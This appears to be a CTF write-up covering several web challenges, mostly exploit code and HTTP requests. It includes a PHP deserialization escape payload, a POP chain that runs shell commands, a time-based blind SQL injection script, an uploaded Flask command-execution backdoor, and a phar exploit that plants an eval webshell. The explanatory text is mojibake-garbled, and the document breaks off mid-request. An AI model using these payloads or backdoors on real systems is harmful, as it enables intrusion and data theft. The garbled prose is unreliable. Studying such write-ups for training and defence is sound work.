<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="string">&#x27;&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;bad&quot;</span>*<span class="number">24</span>+<span class="string">&#x27;&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;good&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span> = <span class="string">&#x27;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$AA</span>=<span class="keyword">new</span> <span class="title class_">GetFlag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$AA</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$AA</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>-&gt;key;</span><br></pre></td></tr></table></figure>

<h2 id="More-Fast"><a href="#More-Fast" class="headerlink" title="More Fast"></a>More Fast</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fast&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Nope&quot;</span>);</span><br><span class="line">Fatal error: Uncaught <span class="built_in">Exception</span>: Nope in /<span class="keyword">var</span>/www/html/index.php:<span class="number">55</span> Stack trace: <span class="comment">#0 &#123;main&#125; thrown in /var/www/html/index.php on line 55</span></span><br></pre></td></tr></table></figure>

<p>GCÁªïËøáÂç≥ÂèØ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Start.__destruct() --&gt; Crypto.__toString() --&gt; Reverse.__get() --&gt; Pwn.__invoke() --&gt; Web.evil() </span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123; <span class="keyword">public</span> <span class="variable">$errMsg</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123; <span class="keyword">public</span> <span class="variable">$obj</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123; <span class="keyword">public</span> <span class="variable">$func</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123; <span class="keyword">public</span> <span class="variable">$func</span>; <span class="keyword">public</span> <span class="variable">$var</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123; <span class="keyword">public</span> <span class="variable">$obj</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$w</span> = <span class="keyword">new</span> <span class="title class_">Web</span>();</span><br><span class="line"><span class="variable">$w</span>-&gt;func = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="comment">//$w-&gt;var  = &#x27;ls /&#x27;;</span></span><br><span class="line"><span class="variable">$w</span>-&gt;<span class="keyword">var</span>  = <span class="string">&#x27;cat /f*&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">Pwn</span>();</span><br><span class="line"><span class="variable">$p</span>-&gt;obj = <span class="variable">$w</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span> = <span class="keyword">new</span> <span class="title class_">Reverse</span>();</span><br><span class="line"><span class="variable">$r</span>-&gt;func = <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Crypto</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;obj = <span class="variable">$r</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;errMsg = <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="variable">$payload</span>, <span class="number">0</span>, -<span class="number">1</span>), PHP_EOL;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="midsql"><a href="#midsql" class="headerlink" title="midsql"></a>midsql</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;select name, price from items where id = &quot;</span>.<span class="variable">$_REQUEST</span>[<span class="string">&quot;id&quot;</span>];</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_fetch_all</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$result</span>[<span class="number">0</span>];</span><br></pre></td></tr></table></figure>

<p>Ê≤°ÁªôwafÔºå‰ΩÜÊòØÂ•ΩÂÉèÊ≤°‰ªÄ‰πàwafÔºå‰∏çÁü•ÈÅìÊúâ‰ªÄ‰πàÈªëÈ≠îÊ≥ïÔºåÁ¨¨‰∏Ä‰∏™Â≠óÁ¨¶ÊàëÁî®Â§ß‰∫éÂ∞è‰∫éÊâãÂä®Âá∫Êù•ÊòØ<code>c</code>Ôºå‰ΩÜÊòØÊàëÁî®Á≠âÂè∑ÂêßÔºå‰ªñÂèà‰∏çÂª∂Êó∂</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://79972a33-c957-4446-a719-2f9e743e59a8.node5.buuoj.cn:81/&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">DELAY_THRESHOLD=<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) //<span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># payload = f&#x27;&#x27;&#x27;if(ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0)%23&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="comment"># ctf</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;ctf&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0)%23&quot;</span></span><br><span class="line">        <span class="comment"># items</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(&#x27;ctf&#x27;)and(table_name)like(&#x27;items&#x27;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0)%23&quot;</span></span><br><span class="line">        <span class="comment"># id,name,price</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select(group_concat(id,name,price))from(items)),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0)%23&quot;</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select/**/group_concat(id,0x2c,name,0x2c,price)/**/from/**/ctf.items),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(2),0)%23&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;if(ascii(substr((select/**/concat_ws(0x2c,id,name,price)/**/from/**/ctf.items/**/limit/**/2,1),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(3),0)%23&quot;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.get(url+<span class="string">&quot;?id=&quot;</span>+payload)</span><br><span class="line">        request_time = time.time() - start_time</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> request_time &gt;= DELAY_THRESHOLD:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Delay triggered! ASCII &gt; <span class="subst">&#123;mid&#125;</span>&quot;</span>)</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;No delay. ASCII &lt;= <span class="subst">&#123;mid&#125;</span>&quot;</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head !=<span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Á∫≥Â∞ºÔºåÂ±ÖÁÑ∂Ê≥®ÂÖ•‰∏çÂá∫Êù•flagÔºåÊàëÂú®ÊÉ≥Ëøô‰∏™‰∏úË•øËøòÁßë‰∏çÁßëÂ≠¶‰∫Ü</p>
<h2 id="flask-disk"><a href="#flask-disk" class="headerlink" title="flask disk"></a>flask disk</h2><p>ÂºÄÂêØ‰∫ÜdebugÊ®°ÂºèÁõ¥Êé•Ë¶ÜÁõñÊéâ<code>app.py</code></p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>5426ce9e-a0bf-49a3-a7a9-e2000adf6592.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://5426ce9e-a0bf-49a3-a7a9-e2000adf6592.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary2Ll9uYmCfKuKAWRn</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://5426ce9e-a0bf-49a3-a7a9-e2000adf6592.node5.buuoj.cn:81/upload</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>708</span><br><span class="line"></span><br><span class="line"><span class="language-python">------WebKitFormBoundary2Ll9uYmCfKuKAWRn</span></span><br><span class="line"><span class="language-python">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;app.py&quot;</span></span></span><br><span class="line"><span class="language-python">Content-<span class="type">Type</span>: text/plain</span></span><br><span class="line"><span class="language-python"></span></span><br><span class="line"><span class="language-python"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span></span><br><span class="line"><span class="language-python"><span class="keyword">import</span> os</span></span><br><span class="line"><span class="language-python">app = Flask(__name__)</span></span><br><span class="line"><span class="language-python"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span></span><br><span class="line"><span class="language-python"><span class="keyword">def</span> <span class="title function_">index</span>():    </span></span><br><span class="line"><span class="language-python">    <span class="keyword">try</span>:        </span></span><br><span class="line"><span class="language-python">        cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>)        </span></span><br><span class="line"><span class="language-python">        data = os.popen(cmd).read()        </span></span><br><span class="line"><span class="language-python">        <span class="keyword">return</span> data    </span></span><br><span class="line"><span class="language-python">    <span class="keyword">except</span>:        </span></span><br><span class="line"><span class="language-python">        <span class="keyword">pass</span>    </span></span><br><span class="line"><span class="language-python">        </span></span><br><span class="line"><span class="language-python">    <span class="keyword">return</span> <span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="language-python"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:    </span></span><br><span class="line"><span class="language-python">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span></span><br><span class="line"><span class="language-python"></span></span><br><span class="line"><span class="language-python">------WebKitFormBoundary2Ll9uYmCfKuKAWRn--</span></span><br><span class="line"><span class="language-python"></span></span><br></pre></td></tr></table></figure>

<p>‰º†Â•Ω‰πãÂêéÁõ¥Êé•RÂ∞±Ë°å‰∫Ü</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cat%20/flag</span><br></pre></td></tr></table></figure>

<h2 id="PharOne"><a href="#PharOne" class="headerlink" title="PharOne"></a>PharOne</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        @<span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ÂèØ‰ª•pharÂèçÂ∫èÂàóÂåñÔºåÂÜô‰∏™Êú®È©¨Â∞±Ë°å‰∫ÜÔºå</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123; <span class="keyword">public</span> <span class="variable">$cmd</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;phar.readonly&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;phar.jpg&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;a.txt&#x27;</span>, <span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;?php @eval(\$_POST[1]);&#x27; &gt; /var/www/html/shell.php&quot;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="title function_ invoke__">rename</span>(<span class="string">&#x27;phar.phar&#x27;</span>, <span class="string">&#x27;phar.jpg&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>ÂéãÁº©ÊàêgzÁªïËøá<code>!preg_match(&quot;/__HALT_COMPILER/i&quot;,FILE_CONTENTS)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gzip -c phar.jpg &gt; exp.phar.gz</span><br></pre></td></tr></table></figure>

<p>‰∏ä‰º†‰∏äÂéª</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>85f86257-1d6e-483d-a846-c0f9ac1ce905.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryPASYrqSA9GBt07ei</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://85f86257-1d6e-483d-a846-c0f9ac1ce905.node5.buuoj.cn:81/index.php</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://85f86257-1d6e-483d-a846-c0f9ac1ce905.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>837</span><br><span class="line"></span><br><span class="line"><span class="language-wren"><span class="operator">-</span><span class="operator">-</span><span 